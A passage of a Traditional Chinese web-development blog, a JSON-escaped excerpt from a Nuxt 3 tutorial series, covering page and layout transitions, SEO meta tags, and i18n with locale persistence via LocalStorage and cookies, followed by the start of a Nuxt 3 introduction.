15 \u0026lt;template\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .page-enter-active, .page-leave-active { transition: all 0.4s; } .page-enter-from, .page-leave-to { opacity: 0; filter: blur(1rem); } \u0026lt;/style\u0026gt; 每個頁面的 pageTransition 預設屬性皆為 { name: 'page', mode: 'out-in' }，name 為 page 也就對應了 CSS 類別的開頭；mode 有 in-out、out-in 及 default 三種參數可選。\n1 2 3 4 5 6 7 8 9 .[pageTransition.name]-enter-active, .[pageTransition.name]-leave-active { transition: all 0.4s; } .[pageTransition.name]-enter-from, .[pageTransition.name]-leave-to { opacity: 0; filter: blur(1rem); } 套用好頁面的轉場，就會有切換頁面時有模糊的效果。\n自訂頁面的轉場 既然知道 pageTransition 的 name 會對應頁面轉場的 CSS 名稱，我們就可以來自定義更多轉場，讓不同頁面套用不同的效果。\n例如在 app.vue 添加 rotate 為前綴的類別名稱 CSS。\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;style\u0026gt; /* ... */ .rotate-enter-active, .rotate-leave-active { transition: all 0.4s; } .rotate-enter-from, .rotate-leave-to { opacity: 0; transform: rotate3d(1, 1, 1, 15deg); } \u0026lt;/style\u0026gt; 在頁面中使用 definePageMeta() 來設定 pageTransition.name 為 rotate。調整 ./pages/login.vue 添加如下程式碼。\npages/login.vue 1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; // ... definePageMeta({ pageTransition: { name: \u0026#39;rotate\u0026#39; } }) \u0026lt;/script\u0026gt; 當頁面切換時，皆會使用預設的模糊轉場效果，當切換至登入頁面就會套用指定的 rotate 頁面轉場，而有旋轉的轉場效果。\n布局的轉場效果 Nuxt 同樣為所有布局 (Layouts) 都設置了轉場，如果要啟用，請將以下 CSS 添加至 app.vue 中。\n1 2 3 4 5 6 7 8 .layout-enter-active, .layout-leave-active { transition: all 0.4s; } .layout-enter-from, .layout-leave-to { filter: grayscale(1); } 建立 ./layouts/teal.vue 布局，程式碼如下：\nlayouts/teal.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;h-screen bg-teal-50\u0026#34;\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 將登入頁面的布局套用 teal。\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: \u0026#39;teal\u0026#39; }) \u0026lt;/script\u0026gt; 建立 ./layouts/green.vue 布局，程式碼如下：\nlayouts/green.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;h-screen bg-teal-50\u0026#34;\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 將註冊頁面的布局套用 green。\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: \u0026#39;green\u0026#39; }) \u0026lt;/script\u0026gt; 在登入頁面與註冊頁面切換時，因為兩個頁面使用了不同的布局，布局的轉場效果，使背影顏色會有灰階效果的轉場。\n你也可以像自訂頁面轉場一樣，來使用 definePageMeta() 設定 layoutTransition.name 屬性，來指定自訂的轉場效果。\n1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; definePageMeta({ layout: \u0026#39;green\u0026#39;, layoutTransition: { name: \u0026#39;slide-in\u0026#39; } }) \u0026lt;/script\u0026gt; 禁用轉場效果 頁面與布局的轉場效果，都可以透過 definePageMeta 來設定 pageTransition 或 layoutTransition 為 false 來禁止套用轉場效果。\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; definePageMeta({ pageTransition: false layoutTransition: false }) \u0026lt;/script\u0026gt; 全域預設的轉場效果 你也可以在 nuxt.config.ts 設置預設的頁面與轉場效果，例如：\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 export default defineNuxtConfig({ pageTransition: { name: \u0026#39;fade\u0026#39;, mode: \u0026#39;out-in\u0026#39; // default }, layoutTransition: { name: \u0026#39;slide\u0026#39;, mode: \u0026#39;out-in\u0026#39; // default } }) 當然要將所有頁面與布局預設禁用也可以設置如下：\n1 2 3 4 export default defineNuxtConfig({ pageTransition: false, layoutTransition: false }) pageTransition 與 layoutTransition 接受的屬性可以參考 TransitionProps。\n元件屬性傳入 transition 在 app.vue 中使用 \u0026lt;NuxtPage /\u0026gt; 時，你可以將 TransitionProps 作為元件的 Props 來啟用全域預設的轉場效果。\n1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage :transition=\u0026#34;{ name: \u0026#39;bounce\u0026#39;, mode: \u0026#39;out-in\u0026#39; }\u0026#34; /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 當使用此方法設定轉場效果時，就不能在頁面中使用 definePageMeta() 來覆蓋這裡的頁面轉場設置。\n以上我們主要實作了導航守衛，來為特定頁面添加瀏覽的權限，我們除了使用客戶端的 User Store 驗證外，也可以搭配 Cookie 再後端進行驗證，甚至為每個請求解析使用者，並查詢資料庫是否具有權限瀏覽，以此來控制使用者瀏覽頁面的權限，除了前端的阻擋外，更重要的是後端 API 也需要搭配進行權限驗證，才能有要的防止網頁漏洞產生，否則可能會發生，使用者無權瀏覽新增或管理的頁面，但是可以透過打 API 來進行相關操作，這樣是非常危險的。最後，我們將頁面切換時設置了進度條與轉場效果，使得整體網站能提供使用者更好的操作體驗，更多的轉場設置，也可以參考 Nuxt 官方文件。\n範例程式碼 - Nuxt 3 - 設置導航守衛與頁面切換效果範例\n添加 HTML Meta Tag 詳細 Nuxt3 添加 HTML Meta Tag 的說明，可以參考 【Nuxt3】開箱即用的 Nuxt3 玩轉筆記 - 搜尋引擎最佳化 (SEO) 與 HTML Meta Tag，這邊我們說明為實作的部落格文章添加 Meta，調整 ./pages/articles/[id].vue 檔案，添加以下程式碼：\npages/articles/[id].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; // ... useHead({ meta: [ { name: \u0026#39;description\u0026#39;, content: `${article.value.summary} | Nuxt 3 Blog` }, { name: \u0026#39;keywords\u0026#39;, content: `${article.value.tags}` }, { property: \u0026#39;og:title\u0026#39;, content: `${article.value.title} | Nuxt 3 Blog` }, { property: \u0026#39;og:description\u0026#39;, content: article.value.summary }, { property: \u0026#39;og:image\u0026#39;, content: article.value.cover } ], title: `${article.value.title} | Nuxt 3 Blog` }) \u0026lt;/script\u0026gt; 其中 article 是我們從 Server API 回傳的指定貼文的資料並具有響應性，最後看看成果。\n在 Nuxt 3 提供了一些可以設置網頁屬性與 Meta 的組合式函數，更能動態的調整與響應，結合 SSR 讓這些標記在伺服器端就能渲染出來，對網站做搜尋引擎最佳化 (SEO) 非常得友善，也是多數人選擇 Nuxt 3 來處理 SSR 與 SEO 的原因。除了 SEO 可能會使用到的的標記外，也有 OG Tag 可以加強網頁的連結預覽效果，雖然 OG Tag 與 SEO 沒有絕對的關係，但是透過伺服器端渲染調整這些 Meta 對搜尋引擎或網站都非常的方便，我們只要根據需求及指引做設定，就能對網站的能見度有所提升。\n邁向國際化實作多國語系I18n 當一個網站需要面向不同國家或不同語言的使用者，我們就需要做國際化 (Internationalization)，將網站內容進行翻譯或語言的對應，讓使用者能理解網頁上的操作或內容，I18n 意謂著「Internationalization」這個單字中，I 和 n 之間有 18 個字母，也正是各個框架的實作多國語系套件的一個常用名稱，例如 Vue 生態就有 vue-i18n，而這篇文章將講述如何在 Nuxt 3 中整合 Vue I18n 來協助實作多國語系。\nNuxt 3 使用 Vue I18n 想要在 Vue 3 使用 Vue I18n 獲得比較好的支援度需要使用正處於 Beta 階段的 v9 版本，因此有幾種方式可以在 Nuxt 整合 Vue I18n，分別是依照 Vue I18n 官方指引、使用 Nuxt Community提供的 @nuxtjs/i18n@next 模組及 @intlify/nuxt3 模組。\n比較早以前，Nuxt 3 社群模組還沒有支援比較新的 Vue I18n，所以需要自己額外的製作插件來安裝，後來也有一些相容性的問題，所以 Vue I18n v9 的作者 kazupon 發布了 @intlify/nuxt3 模組來方便 Nuxt 3 整合 vue-i18n-next (Vue I18n v9)，目前仍然可以使用 @intlify/nuxt3 來進行整合，但我最後選擇使用 @nuxtjs/i18n@next 模組，除了看好是由 Nuxt Community 提供的支援及未來的發展外，也能使用到 @nuxtjs/i18n 提供的一些組合函數等。\nNuxt 3 整合 @nuxtjs/i18n 目前 @nuxtjs/i18n 模組的穩定版本在 v7.3.0，而使用 Vue 3 和 Vue I18n v9 的模組則是下一個迭代版本 v8，所以使用 NPM 安裝的時候需要稍微注意一下。\n下圖於 2020/10/10 擷取自 NPM - @nuxyjs/i18n\nStep 1. 安裝 @nuxtjs/i18n 目前有 A 或 B 兩種方式可以安裝 @nuxtjs/i18n v8 分別如下，可以選擇其中一種即可：\nA. 使用 next 標籤來安裝 v8 版本\n1 2 3 npm install -D @nuxtjs/i18n@next # or # yarn add -D @nuxtjs/i18n@next B. 安裝 @nuxtjs/i18n-edge (Edge Version)\n添加 \u0026quot;@nuxtjs/i18n\u0026quot;: \u0026ldquo;npm:@nuxtjs/i18n-edge\u0026rdquo; 至 package.json 的 dependencies 或 devDependencies 依賴中，看起來可能像這樣： 1 2 3 4 5 6 7 8 { // ... \u0026#34;devDependencies\u0026#34;: { // ... \u0026#34;@nuxtjs/i18n\u0026#34;: \u0026#34;npm:@nuxtjs/i18n-edge\u0026#34;, // ... } } 執行 npm install 這邊我使用的是用 next 標籤來安裝。\nStep 2. 添加模組 於 nuxt.config.ts 中的 modules 屬性添加 '@nuxtjs/i18n'，參考如下：\nnuxt.config.ts 1 2 3 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;] }) Step 3. 設定 i18n 參數 當添加完模組後，我們可以先設置 @nuxhjs/i18n 模組的選項，來測試是否能正常運作，於 nuxt.config.ts 中，添加 i18n 屬性，用以設置**@nuxhjs/i18n** 模組；i18n.vueI18n 設置的選項也可以參考 Vue I18n v9 官方文件。\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { vueI18n: { legacy: false, locale: \u0026#39;zh\u0026#39;, messages: { en: { hello: \u0026#39;Hello!\u0026#39;, language: \u0026#39;Language\u0026#39; }, zh: { hello: \u0026#39;你好!\u0026#39;, language: \u0026#39;語言\u0026#39; } } } } }) 記得設置 i18n.vueI18n.legacy 為 false 來關閉使用較舊的 API 模式。\nStep 4. 確認專案下的 pages 目錄 當完成 Step 3. 的模組設置後，就可以啟動伺服器來看看效果；不過若是 Nuxt 3 專案目錄下缺少了 pages 目錄，可能會無法啟用 Vue Router 自動產生路由，而出現下圖的錯誤。\n我們只需要新增 ./pages/ingex.vue 路由頁面，就可以解決錯誤囉！\n建立英語和繁體中文的語系切換 我們安裝與配置好 @nuxtjs/i18n 後，可以嘗試建立頁面來看看效果，以下以 en 與 zh 作為英語和繁體中文兩個語系的使用範例。\n新增 ./pages/index.vue 內容如下：\npages/index.vue 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 我們就可以使用 $t() 來傳入我們在 nuxt.config.ts 中的 i18n.vueI18n.messages 定義語系與對應的文字，而我們預設是 zh 繁體中文語系，畫面上就出現 hello: \u0026lsquo;你好!\u0026rsquo; 對應的「你好!」文字囉！\n新增按鈕來實現切換不同的語系，完整的程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;setLocale(\u0026#39;en\u0026#39;)\u0026#34; \u0026gt; English \u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;setLocale(\u0026#39;zh\u0026#39;)\u0026#34; \u0026gt; 繁體中文 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale } = useI18n() \u0026lt;/script\u0026gt; 若沒有特殊需求，切換語系你可以選擇直接設定 locale 來自動響應或使用 setLocale() 來設定語系。\n1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, setLocale } = useI18n() locale.value = \u0026#39;en\u0026#39; // or setLocale(\u0026#39;en\u0026#39;) \u0026lt;/script\u0026gt; 完成後我們就可以切換 en 與 zh 語系，當然你也可以製作成選單來放置更多的語系來支援切換。\n獨立存放語系檔案 隨著專案增大，語系的翻譯數量也會增多，而全部放在 nuxt.config.ts 中也實在太過冗長，所以我習慣獨立放置在一個資料夾內做處理。\n稍微調整一下 nuxt.config.ts 如下：\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { defaultLocale: \u0026#39;zh\u0026#39;, langDir: \u0026#39;locales\u0026#39;, locales: [ { code: \u0026#39;en\u0026#39;, file: \u0026#39;en.json\u0026#39;, iso: \u0026#39;en-US\u0026#39;, name: \u0026#39;English\u0026#39; }, { code: \u0026#39;zh\u0026#39;, file: \u0026#39;zh.json\u0026#39;, iso: \u0026#39;zh-TW\u0026#39;, name: \u0026#39;繁體中文\u0026#39; } ], strategy: \u0026#39;no_prefix\u0026#39;, vueI18n: { legacy: false } } }) 接著我們就可以建立各個語系放置的資料夾對應著 i18n.langDir 屬性，目錄名稱為 locales，再依序建立 en.json 與 zh.json 檔案，最終目錄的結構大概會長這樣：\n1 2 3 4 5 6 7 nuxt-app/ ├── ... ├── locales/ │ ├── en.json │ └── zh.json ├── ... └── nuxt.config.ts ./locales/en.json 內容如下：\nlocales/en.json 1 2 3 4 { \u0026#34;hello\u0026#34;: \u0026#34;Hello!\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;Language\u0026#34; } ./locales/zh.json 內容如下：\nlocales/zh.json 1 2 3 4 { \u0026#34;hello\u0026#34;: \u0026#34;你好!\u0026#34;, \u0026#34;language\u0026#34;: \u0026#34;語言\u0026#34; } 翻譯的語系檔案，也可以在根據需求使用 .js、yaml 或 json 格式的檔案，來搭配接受參數來產生翻譯文字。\n持久化語系設定 當使用者切換語系之後，我們希望儲存這個語系設定，讓使用者下次瀏覽網站時，能套用儲存的語系，而不用再次切換，我們可以藉由瀏覽器的 LocalStorage 或 Cookie 來持久化。\nLocalStorage 來儲存語系設定 我們可以在變更語系時，同時將語系儲存至 LocalStorage 之中，下次瀏覽網站時，再從中取出套用語系。\n例如，我們調整 ./pages/index.vue 程式碼如下，在我們自訂的 changeLanguage() 方法內，同時呼叫 localStorage.setItem('i18n-lang', localeCode) 來儲存語系。\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button v-for=\u0026#34;localeItem in locales\u0026#34; :key=\u0026#34;localeItem.code\u0026#34; type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;changeLanguage(localeItem.code)\u0026#34; \u0026gt; {{ localeItem.name }} \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode localStorage.setItem(\u0026#39;i18n-lang\u0026#39;, localeCode) } \u0026lt;/script\u0026gt; 調整 app.vue 從 LocalStorage 讀取 i18n-lang 的設定值\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale } = useI18n() const defaultLocaleCode = locale.value if (process.client) { locale.value = localStorage.getItem(\u0026#39;i18n-lang\u0026#39;) ?? defaultLocaleCode } \u0026lt;/script\u0026gt; 當下次我們瀏覽網站時，就會查看 LocalStorage 中的語系設定並套用。\nCookie 來儲存語系設定 Nuxt 3 的伺服器渲染，會導致第一次的請求無法在伺服器端取得 LocalStorage 的設定，所以上面的例子，仔細看會發現，雖然正確的套用儲存的 en 英語語系設定，但畫面是先從預設的 zh 繁體中文再切換過去，導致語系切換時閃了一下。\n我們可以透過使用 cookie 的方式來儲存語系，這樣伺服器端在接受第一次請求時也能解析出使用者的偏好設定，回傳正確的語系翻譯文字。\n你可以自己使用 Nuxt 3 提供 useCookie 等方式操作 cookie 來實現這套流程，不過呢，@nuxtjs/i18n 模組預設是啟用 cookie 相關的設定，提供的 setLocaleCookie() 與 getLocaleCookie() 可以來協助儲存語系設定至 cookie。\n調整 ./pages/index.vue 程式碼如下，在我們自訂的 changeLanguage() 方法內，同時呼叫 setLocaleCookie(localeCode) 來儲存語系。\npages/index.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;flex flex-col items-center bg-white\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mt-48 text-8xl font-medium text-blue-500\u0026#34;\u0026gt; {{ $t(\u0026#39;hello\u0026#39;) }} \u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;mt-24 space-x-4\u0026#34;\u0026gt; \u0026lt;button v-for=\u0026#34;localeItem in locales\u0026#34; :key=\u0026#34;localeItem.code\u0026#34; type=\u0026#34;button\u0026#34; class=\u0026#34;inline-flex items-center rounded-md border border-transparent bg-blue-100 px-4 py-2 text-sm font-medium text-blue-700 hover:bg-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2\u0026#34; @click=\u0026#34;changeLanguage(localeItem.code)\u0026#34; \u0026gt; {{ localeItem.name }} \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mt-4 flex flex-row justify-center\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;text-gray-600\u0026#34;\u0026gt;{{ $t(\u0026#39;language\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;span class=\u0026#34;ml-4 font-bold text-gray-800\u0026#34;\u0026gt;{{ locale }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocaleCookie } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode setLocaleCookie(localeCode) } \u0026lt;/script\u0026gt; 調整 app.vue 呼叫 getLocaleCookie() 從 cookie 解析的設定值，並再進行套用。\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, getLocaleCookie } = useI18n() const defaultLocaleCode = locale.value locale.value = getLocaleCookie() ?? defaultLocaleCode \u0026lt;/script\u0026gt; 當我們使用 setLocaleCookie() 儲存語系至 cookie，會將 localeCode 儲存在 cookie 的 i18n_redirected 值上，當我們重新進入網頁，cookie 也將自動夾帶了這個 cookie 過去給伺服器端，並由 getLocaleCookie() 解析再由我們進行語系套用。\n其實 @nuxtjs/i18n 因為已將 detectBrowserLanguage.useCookie 預設為 true 等啟用了 cookie 儲存的相關設定，當使用者進入網站時，就會嘗試檢查瀏覽器的 cookie 來將使用者儲存的偏好語言進行套用或重定向。\n因此，我們在 app.vue 也不需要特別從 cookie 取出再進行套用，@nuxtjs/i18n 會自動幫我們完成。\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; // 除非你有特需的需求，不然這邊都不需要自己來了 // import { useI18n } from \u0026#39;vue-i18n\u0026#39; // const { locale, getLocaleCookie } = useI18n() // const defaultLocaleCode = locale.value // locale.value = getLocaleCookie() ?? defaultLocaleCode \u0026lt;/script\u0026gt; 而當使用者調整語系時，在第一個範例有提到，如果沒有特別需求，我們可以直接使用 locale 來設定語系，來自動響應變更語系，再使用 setLocaleCookie(localeCode) 將語系保存至 cookie 之內。\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocaleCookie } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { locale.value = localeCode setLocaleCookie(localeCode) } \u0026lt;/script\u0026gt; 但我們只要使用 setLocal() 方法來套用語系，就會一同更新至 cookie 中進行儲存，非常方便。最後我們將 ./pages/index.vue 中的 調整如下，一樣可以達到在 cookie 中儲存使用者語系並在下次瀏覽網頁時自動套用。\npages/index.vue 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39; const { locale, locales, setLocale } = useI18n() const changeLanguage = (localeCode) =\u0026gt; { setLocale(localeCode) } \u0026lt;/script\u0026gt; 使用 setLocaleCookie() 與 getLocaleCookie() 操作的預設設定，我們可以透過 nuxt.config.ts 中的 i18n.detectBrowserLanguage 進行調整，例如，調整 cookieKey 來變更儲存的名稱 i18n_redirected 等，更多選項可以參考這裡。\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 11 export default defineNuxtConfig({ modules: [\u0026#39;@nuxtjs/i18n\u0026#39;], i18n: { // ... detectBrowserLanguage: { useCookie: true, cookieKey: \u0026#39;i18n_redirected\u0026#39; }, // ... } }) @nuxtjs/i18n 模組提供的 cookie 操作語系持久化，甚至能做到一些重導向等行為，較 Nuxt 3 提供 useCookie 等方式自己來實現這套流程能更擁有更多功能。\n範例程式碼 - Nuxt 3 - 搜尋引擎最佳化 (SEO) 之設定網頁 Meta 及 OG Tag 範例\n","date":"2023-01-16T00:00:00Z","image":"https://live.staticflickr.com/65535/52630283696_c93e29e870_o.png","permalink":"https://wayneblog.ga/2023-01-16/nuxt-nuxt3-practice-project/","title":"【Nuxt3】實戰練習 - 實作部落格"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n在使用 Vue 3 開發網站可能會面臨需要做 SEO 的情境，為了解決該情境問題，你可能會找到使用 Vite 做預渲染或其他方式，Nuxt 3 也是其中一個解決方案，且有更多強大的功能，目前 Nuxt 3 已經正式發布穩定版，就讓我們開始嘗鮮上手吧！\n本篇會著重在 Nuxt 3 的特色與功能學習，所以你可能需具備些 Vue 3 基礎，我將從搭建 Nuxt 3 開發環境、頁面路由與佈局一直到使用 Nuxt 3 建立 SEO 所需的資訊做些筆記及介紹，讓你有個概念並嘗試用 Nuxt 3 來做 SSR 或 SSG，進而解決 Vue 3 SPA 不好做 SEO 的問題。\nNuxt 3 介紹 前言 採用 SSR + SPA，將第一個畫面透過 SSR 產生，其他就交給 CSR 來做處理，既能兼具 SEO 還能擁有 SPA 的使用者體驗，不是很完美嗎？沒有錯，但在沒有任何框架輔助之下，同一個頁面你可能就需要實作兩次程式碼，也就是前後端各一次的渲染邏輯，這也就是相應的代價。在介紹 Nuxt 3 之前就稍微提一下 Isomorphic JavaScript 與 Universal JavaScript。\nIsomorphic JavaScript 與 Universal JavaScript Isomorphic JavaScript 隨著 Node.js 的出現，讓客戶端瀏覽器之外的伺服器也能執行 JavaScript 程式碼，使得 JavaScript 成為一種同構語言 (Isomorphic Language)。Isomorphic JavaScript 即稱之為同樣的 JavaScript 程式碼可以在客戶端及伺服器端運行；也就是說同一份 Code 除了能在前端瀏覽器也能在後端執行。\n然而 Isomorphic JavaScript 與 Universal JavaScript 的名詞存有一些爭議與差異，如今，Isomorphic JavaScript 多以稱相同的程式碼元件，可以在客戶端與伺服器端用來組裝或渲染出頁面的技術。\nUniversal JavaScript Michael Jackson 的文章提到，Isomorphic 這個詞的含義「corresponding or similar in form and relations」為兩個實體不相同，但具有相似的操作或對應的關係，換句話說就是，兩個看起來不一樣的使用方法或語法，但最終的執行結果是一樣的，例如 jQuery 或 Zepto 操作 DOM 的語法長的不大一樣，但是最終也都是對應 JavaScript 的 document.querySelector 等方法。\n所以說，為了描述相同的程式碼但能在不同環境中運行的名詞，就有了 Universal JavaScript 一詞，這個名字告訴人們 JavaScript 它不僅可以在服務器和瀏覽器上運行，還可以在本機設備和嵌入式架構上運行。\n那麼 Isomorphic JavaScript 和 Universal JavaScript 與我們又有什麼關係呢？\n有的，因為 Nuxt 3 正是一個 Isomorphic JavaScript 框架，Nuxt 3 是目前你使用 Vue 3 在開發網站時，會需要採用 SSR 技術或優化 SEO 問題所可以使用的解決方案。\nNuxt 3 Nuxt 3 官方在 2022/11/16 正式發布穩定版本 Nuxt 3.0 stable。\nNuxt 3 官網的標語 The Intuitive Web Framework，Nuxt 3 將讓你更直覺的體驗混合渲染等新功能，讓在使用 Vue 3 開發時變得更加簡單！\nNuxt 3 的新特性 從 Nuxt 3 官網的提供訊息所列，簡單說明一下 Nuxt 3 的新特性，共有下列 12 個：\nLighter：更輕量，針對現在瀏覽器，伺服器部署與客戶端打包能減少最高 75 倍之多。 Faster：更快速，通過 Nitro 提供支持的動態伺服器端程式碼拆分來優化冷啟動問題。 Hybird：動態的靜態頁面生成和其他高級模式，現在這些都將成為可能。 Suspense：在導航觸發的前後，皆可以在任何元件中取得數據資料。 Composition API：使用 Composition API 和 Nuxt 3 的 Composables 實現真正的程式碼可重用性。 Nuxt CLI：全新的零依賴體驗，幫助你輕鬆建立專案與模組整合。 Nuxt Dev Tools：專屬開發除錯工具，提供更多的資訊與快速修復，讓工作更高效。 Nuxt Kit：具備基於 TypeScript 和跨版本兼容性的全新模組開發。 webpack 5：更快速的打包時間與打包出更小的體積，並且無需任何配置。 Vite：使用 Vite 作為打包工具，體驗閃電般快速的 HMR。 Vue 3：完全支持 Vue 3。 TypeScript：使用 TypeScript 與 ESM 構建而成，無需額外的配置步驟。 Nitro Nuxt 3 由一個全新的伺服器引擎 Nitro 提供支持，它具有以下幾個特點：\n跨平台支持，支持 Node.js 與瀏覽器等。 Serverless 支持。 API 路由，使用 unjs/h3。 自動程式碼拆分 (code-splitting) 與異步加載 chunk (async-loaded chunks)。 混合渲染模式，供靜態 (static)與無伺服器 (serverless) 網站。 開發伺服器上的 HMR (hot module reloading)。 簡單來說，Nitro 已經是 Nuxt 3 包含的全新伺服器引擎，無需再進行配置。Nitro 除了支援 SPA、建立靜態的網站，甚至能在後端打 API 時直接調用相關函數，從而降低 API 